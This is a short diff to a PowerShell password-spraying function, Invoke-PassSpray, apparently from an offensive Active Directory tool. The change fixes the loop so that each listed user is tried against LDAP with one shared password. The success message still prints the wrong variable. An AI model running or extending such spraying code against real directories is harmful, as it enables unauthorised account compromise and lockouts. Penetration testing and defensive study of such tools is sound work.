@@ -57,7 +57,7 @@ function Invoke-PassSpray {
      	
 	foreach($usr in $AllUsers){
 		try {
-		        $directoryEntry = New-Object System.DirectoryServices.DirectoryEntry($LDAPPath, $UserName, $Password)
+		        $directoryEntry = New-Object System.DirectoryServices.DirectoryEntry($LDAPPath, $usr, $Password)
 		        if ($directoryEntry.name -ne $null) {
 		            Write-Output "[+] Authentication Successful for user $UserName"
 		            $KeepTrack = $True
